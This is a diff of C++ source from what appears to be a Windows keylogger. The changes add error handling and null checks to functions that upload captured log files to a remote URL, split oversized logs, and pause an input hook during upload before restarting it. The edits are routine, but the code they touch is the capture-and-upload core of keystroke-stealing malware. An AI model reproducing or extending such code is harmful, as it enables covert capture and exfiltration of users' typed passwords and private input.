@@ -157,13 +157,21 @@ std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& 
             _bstr_t content;
             request->get_ResponseText(content.GetAddress());
 
-            const std::wstring decodedReply = content.GetBSTR();
-            debugTrace(std::wstring(L"received\n") + decodedReply);
-            // TODO: process request
+            if (content.length() != 0) {
 
-            return content.length() != 0;
-        } catch (std::exception const& ee) { std::cerr << ee.what(); }
-        catch (...) {}
+                std::wstring decodedReply;
+                if (content.GetBSTR()) {
+                    decodedReply = static_cast<wchar_t*>(content.GetBSTR());
+                    debugTrace(std::wstring(L"received\n") + decodedReply);
+                    // TODO: process request
+                }
+
+                return true;
+            }
+
+            return false;
+        } catch(std::exception const& ee) {std::cerr << ee.what();}
+        catch(...) {std::cerr << "unhandled exception in" << __FUNCTION__;}
         return false;
     };
 
@@ -173,22 +181,24 @@ std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& 
 
 void trySplitLog(std::tr2::sys::path const& logPath)
 {
-    using namespace std::tr2::sys;
-    const auto fileSize = file_size(logPath, std::error_code());
-    if (fileSize > fileSizeToSplit) {
-        // split file into two
-        {
-            std::ifstream orig(logPath, std::ios::binary);
-            std::ofstream part1(path(logPath).replace_extension("._0.txt"), std::ios::binary);
+    try {
+        using namespace std::tr2::sys;
+        const auto fileSize = file_size(logPath, std::error_code());
+        if (fileSize > fileSizeToSplit) {
+            // split file into two
+            {
+                std::ifstream orig(logPath, std::ios::binary);
+                std::ofstream part1(path(logPath).replace_extension("._0.txt"), std::ios::binary);
 
-            std::copy_n(std::istreambuf_iterator<char>(orig), fileSize / 2, std::ostreambuf_iterator<char>(part1));
-            std::find_if(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), [&part1](char ch) { if (ch == '\n') return true; part1 << ch; return false; });
-            std::copy(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), std::ostreambuf_iterator<char>(std::ofstream(path(logPath).replace_extension("._1.txt"), std::ios::binary)));
+                std::copy_n(std::istreambuf_iterator<char>(orig), fileSize / 2, std::ostreambuf_iterator<char>(part1));
+                std::find_if(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), [&part1](char ch) { if (ch == '\n') return true; part1 << ch; return false; });
+                std::copy(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), std::ostreambuf_iterator<char>(std::ofstream(path(logPath).replace_extension("._1.txt"), std::ios::binary)));
+            }
+            remove(logPath, std::error_code());
         }
-        remove(logPath, std::error_code());
-    }
+    } catch(std::exception const& ee) {std::cerr << ee.what();}
+    catch(...) {std::cerr << "unhandled exception in" << __FUNCTION__;}
 }
-
 
 std::future<bool> postAllNewLogfiles()
 {
@@ -197,8 +207,8 @@ std::future<bool> postAllNewLogfiles()
         // disable hooking while sending
         const bool isHooking = InputHooker::instance().isHooking();
         InputHooker::instance().stopHook();
-        auto continueHooking = [isHooking](void*) {if (isHooking) InputHooker::instance().startHook(); };
-        std::unique_ptr<void, decltype(continueHooking)> onRet((void*)1/*must be not nullptr*/, continueHooking);
+        auto enableLogger = [isHooking](void*) {if(isHooking) InputHooker::instance().startHook(); };
+        std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
 
 
         using namespace std::tr2::sys;
@@ -208,8 +218,9 @@ std::future<bool> postAllNewLogfiles()
         // get list of new files
         directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());
 
-        bool success = true;
         std::vector<std::future<void>> splitTasks;
+
+        bool success = true;
         for (auto& log : logDirIter)
             if (log != Logger::instance().logFilename()) {
                 const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));
